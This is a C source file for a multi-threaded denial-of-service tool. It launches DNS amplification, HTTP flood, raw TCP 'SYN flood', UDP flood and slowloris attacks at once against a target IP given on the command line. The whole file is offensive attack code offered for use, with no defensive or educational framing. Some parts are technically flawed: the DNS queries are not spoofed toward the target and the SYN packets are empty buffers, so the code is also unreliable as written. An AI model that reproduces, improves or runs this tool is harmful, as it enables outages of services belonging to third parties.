#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>

#define BUFFER_SIZE 8192
#define MAX_DNS_SERVERS 1000
#define MAX_USER_AGENTS 1753

// Global variables
char *dns_servers[MAX_DNS_SERVERS];
int dns_server_count = 0;
char *user_agents[MAX_USER_AGENTS];
int user_agent_count = 0;
pthread_mutex_t lock;
volatile int payload_count = 0;
int quiet_mode = 0;

// Function prototypes
void load_dns_servers(const char *filename);
void load_user_agents(const char *filename);
void *dns_amplification_attack(void *arg);
void *http_flood(void *arg);
void *tcp_syn_flood(void *arg);
void *udp_flood(void *arg);
void *slowloris(void *arg);
void log_payload(const char *payload_name, const char *source_ip, const char *target_ip, int count);
char *get_local_ip();
void start_attack(const char *target_ip);

void load_dns_servers(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s in current directory, trying /usr/share/dos-tools/\n", filename);
        char alternative_path[256];
        snprintf(alternative_path, sizeof(alternative_path), "/usr/share/dos-tools/%s", filename);
        file = fopen(alternative_path, "r");
        if (!file) {
            fprintf(stderr, "Could not open %s in /usr/share/dos-tools/ either\n", filename);
            exit(1);
        }
    }

    char line[256];
    while (fgets(line, sizeof(line), file) && dns_server_count < MAX_DNS_SERVERS) {
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') {
            line[len-1] = '\0';
        }
        dns_servers[dns_server_count] = strdup(line);
        dns_server_count++;
    }

    fclose(file);
    if (dns_server_count == 0) {
        fprintf(stderr, "No DNS servers found in %s\n", filename);
        exit(1);
    }
    fprintf(stderr, "Loaded %d DNS servers from %s\n", dns_server_count, filename);
}

void load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s in current directory, trying /usr/share/dos-tools/\n", filename);
        char alternative_path[256];
        snprintf(alternative_path, sizeof(alternative_path), "/usr/share/dos-tools/%s", filename);
        file = fopen(alternative_path, "r");
        if (!file) {
            fprintf(stderr, "Could not open %s in /usr/share/dos-tools/ either\n", filename);
            exit(1);
        }
    }
    char line[1024];
    while (fgets(line, sizeof(line), file) && user_agent_count < MAX_USER_AGENTS) {
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') {
            line[len-1] = '\0';
        }
        user_agents[user_agent_count] = strdup(line);
        user_agent_count++;
    }

    fclose(file);
    if (user_agent_count == 0) {
        fprintf(stderr, "No user agents found in %s\n", filename);
        exit(1);
    }
    fprintf(stderr, "Loaded %d user agents from %s\n", user_agent_count, filename);
}

void *dns_amplification_attack(void *arg) {
    const char *target_ip = (const char *)arg;
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    while (1) {
        const char *dns_server = dns_servers[rand() % dns_server_count];
        const char *user_agent = user_agents[rand() % user_agent_count];

        sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(53); // DNS uses port 53

        if (inet_pton(AF_INET, dns_server, &serv_addr.sin_addr) <= 0) {
            perror("Invalid DNS server address");
            close(sockfd);
            continue;
        }

        snprintf(buffer, sizeof(buffer),
                 "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                 "\x03\x77\x77\x77\x07\x65\x78\x61\x6d\x70\x6c\x65"
                 "\x03\x63\x6f\x6d\x00\x00\x01\x00\x01");

        sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("DNS Amplification", get_local_ip(), target_ip, payload_count);
        }
        pthread_mutex_unlock(&lock);

        close(sockfd);
        usleep(10000); // 10ms delay for rapid sending
    }

    return NULL;
}

void *http_flood(void *arg) {
    const char *target_ip = (const char *)arg;
    const char *payload = "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nRange: bytes=0-18446744073709551615\r\n\r\n";
    char full_payload[BUFFER_SIZE];
    int sockfd;
    struct sockaddr_in serv_addr;

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(80);

        if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address/Address not supported");
            close(sockfd);
            continue;
        }

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            continue;
        }

        const char *user_agent = user_agents[rand() % user_agent_count];
        snprintf(full_payload, sizeof(full_payload), payload, target_ip, user_agent);
        send(sockfd, full_payload, strlen(full_payload), 0);
        close(sockfd);

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("HTTP Flood", get_local_ip(), target_ip, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(10000); // 10ms delay for rapid sending
    }

    return NULL;
}

void *tcp_syn_flood(void *arg) {
    const char *target_ip = (const char *)arg;
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(0); // Random port

    if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        return NULL;
    }

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("TCP SYN Flood", get_local_ip(), target_ip, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(10000); // 10ms delay for rapid sending
    }

    close(sockfd);
    return NULL;
}

void *udp_flood(void *arg) {
    const char *target_ip = (const char *)arg;
    int sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(12345);

    if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sockfd);
        return NULL;
    }

    while (1) {
        snprintf(buffer, sizeof(buffer), "Flooding UDP packet to %s", target_ip);
        sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("UDP Flood", get_local_ip(), target_ip, payload_count);
        }
        pthread_mutex_unlock(&lock);

        usleep(10000); // 10ms delay for rapid sending
    }

    close(sockfd);
    return NULL;
}

void *slowloris(void *arg) {
    const char *target_ip = (const char *)arg;
    const char *payload = "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: 10000\r\n\r\n";
    char full_payload[BUFFER_SIZE];
    int sockfd;
    struct sockaddr_in serv_addr;

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            continue;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(80);

        if (inet_pton(AF_INET, target_ip, &serv_addr.sin_addr) <= 0) {
            perror("Invalid address/Address not supported");
            close(sockfd);
            continue;
        }

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            continue;
        }

        const char *user_agent = user_agents[rand() % user_agent_count];
        snprintf(full_payload, sizeof(full_payload), payload, target_ip, user_agent);
        send(sockfd, full_payload, strlen(full_payload), 0);
        // Slowly send data in chunks
        for (int i = 0; i < 1000; i++) {
            send(sockfd, ".", 1, 0);
            usleep(1000); // Sleep for 1ms between each byte
        }
        close(sockfd);

        pthread_mutex_lock(&lock);
        payload_count++;
        if (!quiet_mode) {
            log_payload("Slowloris", get_local_ip(), target_ip, payload_count);
        }
        pthread_mutex_unlock(&lock);
        
        usleep(10000); // 10ms delay for rapid sending
    }

    return NULL;
}

void log_payload(const char *payload_name, const char *source_ip, const char *target_ip, int count) {
    printf("Payload: %s\nNumber Sent: %d\nSource IP: %s\nTarget IP: %s\n\n",
           payload_name, count, source_ip, target_ip);
}

char *get_local_ip() {
    static char ip[INET_ADDRSTRLEN];
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    inet_ntop(AF_INET, &sa.sin_addr, ip, INET_ADDRSTRLEN);
    return ip;
}

void start_attack(const char *target_ip) {
    pthread_t threads[5];

    pthread_mutex_init(&lock, NULL);

    pthread_create(&threads[0], NULL, dns_amplification_attack, (void *)target_ip);
    pthread_create(&threads[1], NULL, http_flood, (void *)target_ip);
    pthread_create(&threads[2], NULL, tcp_syn_flood, (void *)target_ip);
    pthread_create(&threads[3], NULL, udp_flood, (void *)target_ip);
    pthread_create(&threads[4], NULL, slowloris, (void *)target_ip);

    for (int i = 0; i < 5; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_mutex_destroy(&lock);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_ip>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    load_dns_servers("dns_servers.txt");
    load_user_agents("user_agents.txt");

    start_attack(target_ip);

    return 0;
}
